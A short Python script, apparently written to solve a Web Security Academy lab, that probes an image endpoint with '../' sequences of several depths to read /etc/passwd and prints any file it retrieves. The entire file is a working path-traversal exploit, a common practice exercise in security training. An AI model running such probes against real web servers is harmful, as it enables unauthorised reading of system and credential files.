import requests
test = [
    "../../../../..",
    "../../../..",
    "../../..",
    "../..",
    "..",
]
for t in test : 
    url = "https://0a3300c403076cd380683f2b00e1001b.web-security-academy.net/image?filename=" + t + "/etc/passwd"
    response = requests.get(url)
    if response.status_code == 200:
        print(f"Found: {url}")
        print(response.text)
    else:
        print(f"Not found: {url}")